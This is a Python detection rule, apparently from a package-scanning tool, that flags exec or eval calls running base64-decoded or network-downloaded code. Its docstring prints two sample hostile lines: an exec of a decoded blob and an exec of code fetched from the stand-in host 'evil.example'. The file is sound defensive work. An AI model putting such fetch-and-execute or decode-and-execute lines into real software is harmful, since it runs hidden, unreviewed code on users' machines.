"""Code that runs code nobody can read in the source: decoded or downloaded.

    exec(base64.b64decode("aW1wb3J0IG9z..."))         # decoded
    exec(requests.get("https://evil.example").text)   # downloaded

The real code only exists at runtime, so a reviewer (or a simple text scanner)
reading the package sees nothing suspicious. Honest code has essentially no reason
to decode a blob and run it, or to download code and run it, so this is critical.

exec/eval/compile on their own aren't flagged (dataclasses and template engines
use them), and neither are decoders or network calls on their own.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding
from crotalus.rules.static_code_analysis_helpers import (
    DECODERS,
    RUN_CODE,
    calls,
    is_network,
    origins,
    python_files,
    read,
    snippet,
)


def check(context: AnalysisContext) -> list[Finding]:
    findings = []
    for archive, path, source in python_files(context):
        # Running code needs exec or eval, and even `e = exec` contains the word, so
        # files without either can be skipped without parsing (the slow part).
        if "exec" not in source and "eval" not in source:
            continue
        py_file = read(source)
        if py_file is None:
            continue

        for call_name, call_node in calls(py_file):
            if call_name not in RUN_CODE or not call_node.args:
                continue
            # Where the code being run came from (only the first argument is code).
            code_origins = origins(call_node.args[0], py_file)
            decoders = sorted(origin for origin in code_origins if origin in DECODERS)
            network = sorted(origin for origin in code_origins if is_network(origin))
            if not decoders and not network:
                continue

            kinds = []
            if decoders:
                kinds.append("decoded")
            if network:
                kinds.append("network")
            findings.append(
                Finding(
                    rule_id="hidden_code_exec",
                    severity="critical",
                    message=f"{call_name}() runs {' and '.join(kinds)} code in {path}",
                    evidence={
                        "archive": archive,
                        "file": path,
                        "line": call_node.lineno,
                        "kinds": kinds,
                        "decoders": decoders,
                        "network": network,
                        "snippet": snippet(py_file, call_node),
                    },
                )
            )
    return findings
